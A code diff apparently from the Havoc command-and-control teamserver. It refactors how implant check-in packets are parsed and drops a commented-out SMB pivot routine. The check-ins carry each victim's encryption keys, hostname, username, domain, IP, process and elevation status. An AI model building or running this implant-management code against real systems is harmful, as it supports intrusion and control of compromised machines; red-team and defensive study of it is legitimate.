@@ -407,62 +407,6 @@ func AgentParseResponse(AgentID int, Parser *parser.Parser) *Agent {
 
     logger.Debug("Finished parsing demon")
 
-    /*if Parser.Length() >= 4 {
-    	logger.Debug("There is more (optional info)")
-    	for {
-    		if Parser.Length() != 0 {
-    			var OptionalType = Parser.ParseInt32()
-
-    			switch OptionalType {
-
-    			case 0:
-    				break
-
-    			case DEMON_CHECKIN_OPTION_PIVOTS:
-    				var Count = Parser.ParseInt32()
-    				for Count == 0 {
-    					if Parser.Length() > 4 {
-    						var (
-    							DemonID  	= Parser.ParseInt32()
-    							_ 			= Parser.ParseBytes()
-    							CheckinJob 	= DemonJob{Command: COMMAND_CHECKIN}
-    							Payload 	= BuildPayloadMessage([]DemonJob{CheckinJob}, Session.Encryption.AESKey, Session.Encryption.AESIv)
-    							Packer  	= packer.NewPacker(nil, nil)
-    							PivotJob 	DemonJob
-    						)
-
-    						Packer.AddInt32(int32(DemonID))
-    						Packer.AddBytes(Payload)
-
-    						PivotJob = DemonJob {
-    							Command: COMMAND_PIVOT,
-    							Data: []interface{}{
-    								DEMON_PIVOT_SMB_COMMAND,
-    								DemonID,
-    								Packer.Buffer(),
-    							},
-    						}
-
-    						Session.AddJobToQueue(PivotJob)
-
-    						Count--
-    					} else {
-    						break
-    					}
-
-    				}
-
-    			default:
-    				logger.Debug(fmt.Sprintf("OptionalType [%v : %x] not found", OptionalType, OptionalType))
-    				continue
-    			}
-
-    		} else {
-    			break
-    		}
-    	}
-    }*/
-
     return Session
 }
 
@@ -1556,111 +1500,91 @@ func (demon *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Rou
 
         if Parser.Length() > 0 {
             var (
-                MagicValue  int
-                DemonID     int
-                Hostname    string
-                DomainName  string
-                Username    string
-                InternalIP  string
-                ProcessName string
-                ProcessPID  int
-                OsVersion   []int
-                OsArch      int
-                Elevated    int
-                ProcessArch int
-                ProcessPPID int
-                SleepDelay  int
+                MagicValue      int
+                DemonID         int
+                Hostname        string
+                DomainName      string
+                Username        string
+                InternalIP      string
+                ProcessName     string
+                ProcessPID      int
+                OsVersion       []int
+                OsArch          int
+                Elevated        int
+                ProcessArch     int
+                ProcessPPID     int
+                SleepDelay      int
+                Session         = &Agent{
+                    Encryption: struct {
+                        AESKey []byte
+                        AESIv  []byte
+                    }{
+                        AESKey: Parser.ParseAtLeastBytes(32),
+                        AESIv:  Parser.ParseAtLeastBytes(16),
+                    },
+
+                    Active:     false,
+                    SessionDir: "",
+
+                    Info: new(AgentInfo),
+                }
             )
 
-            logger.Debug("Checkin Dmp:\n" + hex.Dump(Parser.Buffer()))
+            DemonID = Parser.ParseInt32()
+            logger.Debug(fmt.Sprintf("Parsed DemonID: %x", DemonID))
 
-            /*
-            	   	[ SIZE         ] 4 bytes
-            		[ COMMAND ID   ] 4 bytes
-            		[ Demon ID     ] 4 bytes
-            		[ AES KEY      ] 32 bytes
-            		[ AES IV       ] 16 bytes
-            		[ Magic Value  ] 4 bytes
-            		[ Demon ID     ] 4 bytes
-            		[ User Name    ] size + bytes
-            		[ Host Name    ] size + bytes
-            		[ Domain       ] size + bytes
-            		[ IP Address   ] 16 bytes?
-            		[ Process Name ] size + bytes
-            		[ Process ID   ] 4 bytes
-            		[ Parent  PID  ] 4 bytes
-            		[ Process Arch ] 4 bytes
-            		[ Elevated     ] 4 bytes
-            		[ OS Info      ] ( 5 * 4 ) bytes
-            		[ OS Arch      ] 4 bytes
-            		..... more
-            */
-
-            var Session = &Agent{
-                Encryption: struct {
-                    AESKey []byte
-                    AESIv  []byte
-                }{
-                    AESKey: Parser.ParseAtLeastBytes(32),
-                    AESIv:  Parser.ParseAtLeastBytes(16),
-                },
-
-                Active:     false,
-                SessionDir: "",
-
-                Info: new(AgentInfo),
+            if Parser.Length() >= 4 {
+                Hostname = string(Parser.ParseBytes())
+            } else {
+                Message["Type"] = "Info"
+                Message["Message"] = "Failed to parse agent request"
+                goto SendMessage
             }
 
-            // TODO: error handling. check if there is enough in the Parser to parse -> avoid crashing or invalid sessions
-            MagicValue = Parser.ParseInt32()
-            DemonID = Parser.ParseInt32()
+            if Parser.Length() >= 4 {
+                Username = string(Parser.ParseBytes())
+            } else {
+                Message["Type"] = "Info"
+                Message["Message"] = "Failed to parse agent request"
+                goto SendMessage
+            }
 
-            logger.Debug(fmt.Sprintf("MagicValue: %x", MagicValue))
-            logger.Debug(fmt.Sprintf("DemonID: %x", DemonID))
+            if Parser.Length() >= 4 {
+                DomainName = string(Parser.ParseBytes())
+            } else {
+                Message["Type"] = "Info"
+                Message["Message"] = "Failed to parse agent request"
+                goto SendMessage
+            }
 
-            Hostname = string(Parser.ParseBytes())
-            Username = string(Parser.ParseBytes())
-            DomainName = string(Parser.ParseBytes())
-            InternalIP = string(Parser.ParseBytes())
-
-            logger.Debug(fmt.Sprintf(
-                "\n"+
-                    "Hostname: %v\n"+
-                    "Username: %v\n"+
-                    "Domain  : %v\n"+
-                    "InternIP: %v\n",
-                Hostname, Username, DomainName, InternalIP))
+            if Parser.Length() >= 4 {
+                InternalIP = string(Parser.ParseBytes())
+            } else {
+                Message["Type"] = "Info"
+                Message["Message"] = "Failed to parse agent request"
+                goto SendMessage
+            }
 
             ProcessName = string(Parser.ParseBytes())
-            ProcessPID = Parser.ParseInt32()
+            ProcessPID  = Parser.ParseInt32()
             ProcessPPID = Parser.ParseInt32()
             ProcessArch = Parser.ParseInt32()
-            Elevated = Parser.ParseInt32()
-
-            logger.Debug(fmt.Sprintf(
-                "\n"+
-                    "ProcessName: %v\n"+
-                    "ProcessPID : %v\n"+
-                    "ProcessPPID: %v\n"+
-                    "ProcessArch: %v\n"+
-                    "Elevated   : %v\n",
-                ProcessName, ProcessPID, ProcessPPID, ProcessArch, Elevated))
-
-            OsVersion = []int{Parser.ParseInt32(), Parser.ParseInt32(), Parser.ParseInt32(), Parser.ParseInt32(), Parser.ParseInt32()}
-            OsArch = Parser.ParseInt32()
-            SleepDelay = Parser.ParseInt32()
+            Elevated    = Parser.ParseInt32()
+            OsVersion   = []int{Parser.ParseInt32(), Parser.ParseInt32(), Parser.ParseInt32(), Parser.ParseInt32(), Parser.ParseInt32()}
+            OsArch      = Parser.ParseInt32()
+            SleepDelay  = Parser.ParseInt32()
 
             Session.Active = true
 
-            Session.NameID = fmt.Sprintf("%x", DemonID)
-            Session.Info.MagicValue = MagicValue
+            Session.NameID           = fmt.Sprintf("%x", DemonID)
+            Session.Info.MagicValue  = MagicValue
             Session.Info.FirstCallIn = time.Now().Format("02-01-2006 15:04:05")
-            Session.Info.LastCallIn = time.Now().Format("02-01-2006 15:04:05.999")
-            Session.Info.Hostname = Hostname
-            Session.Info.DomainName = DomainName
-            Session.Info.Username = Username
-            Session.Info.InternalIP = InternalIP
-            Session.Info.SleepDelay = SleepDelay
+            Session.Info.LastCallIn  = time.Now().Format("02-01-2006 15:04:05.999")
+            Session.Info.Hostname    = Hostname
+            Session.Info.DomainName  = DomainName
+            Session.Info.Username    = Username
+            Session.Info.InternalIP  = InternalIP
+            Session.Info.SleepDelay  = SleepDelay
 
             // Session.Info.ExternalIP 	= strings.Split(connection.RemoteAddr().String(), ":")[0]
             // Session.Info.Listener 	= t.Name
@@ -1745,36 +1669,45 @@ func (demon *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Rou
             Session.Info.ProcessPPID = ProcessPPID
             Session.Info.ProcessPath = ProcessName
 
+            Session.SessionDir = logr.LogrInstance.AgentPath + "/" + Session.NameID
+
             Message["Output"] = fmt.Sprintf(
                 "\n"+
-                    "Meta Data:\n"+
-                    "  - Demon ID           : %v\n"+
-                    "  - Magic Value        : %x\n"+
-                    "  - First Call In      : %v\n"+
-                    "  - Last  Call In      : %v\n"+
-                    "  - AES Key            : %v\n"+
-                    "  - AES IV             : %v\n"+
-                    "  - Sleep Delay        : %v\n"+
-                    "\n"+
-                    "Host Info:\n"+
-                    "  - Host Name          : %v\n"+
-                    "  - User Name          : %v\n"+
-                    "  - Domain Name        : %v\n"+
-                    "  - Internal IP        : %v\n"+
-                    "\n"+
-                    "Process Info:\n"+
-                    "  - Process Name       : %v\n"+
-                    "  - Process Arch       : %v\n"+
-                    "  - Process ID         : %v\n"+
-                    // "  - Process Parent ID  : %v\n" +
-                    "  - Process Path       : %v\n"+
-                    "  - Process Elevated   : %v\n"+
-                    "\n"+
-                    "Operating System:\n"+
-                    "  - Version            : %v\n"+
-                    "  - Build              : %v.%v.%v.%v.%v\n"+
-                    "  - Arch               : %v\n"+
-                    "",
+                "Teamserver:\n"+
+                "  - Session Path       : %v\n"+
+                "\n"+
+                "Meta Data:\n"+
+                "  - Agent ID           : %v\n"+
+                "  - Magic Value        : %x\n"+
+                "  - First Call In      : %v\n"+
+                "  - Last  Call In      : %v\n"+
+                "  - AES Key            : %v\n"+
+                "  - AES IV             : %v\n"+
+                "  - Sleep Delay        : %v\n"+
+                "\n"+
+                "Host Info:\n"+
+                "  - Host Name          : %v\n"+
+                "  - User Name          : %v\n"+
+                "  - Domain Name        : %v\n"+
+                "  - Internal IP        : %v\n"+
+                "\n"+
+                "Process Info:\n"+
+                "  - Process Name       : %v\n"+
+                "  - Process Arch       : %v\n"+
+                "  - Process ID         : %v\n"+
+                // "  - Process Parent ID  : %v\n" +
+                "  - Process Path       : %v\n"+
+                "  - Process Elevated   : %v\n"+
+                "\n"+
+                "Operating System:\n"+
+                "  - Version            : %v\n"+
+                "  - Build              : %v.%v.%v.%v.%v\n"+
+                "  - Arch               : %v\n"+
+                "",
+
+                // Teamserver
+                Session.SessionDir,
+
                 // Meta Data
                 Session.NameID,
                 Session.Info.MagicValue,
@@ -1805,10 +1738,10 @@ func (demon *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Rou
                 // TODO: add Optional data too
             )
 
-            // free memory
             Session = nil
         }
 
+    SendMessage:
         Funcs.DemonOutput(demon.NameID, HAVOC_CONSOLE_MESSAGE, Message)
 
         break
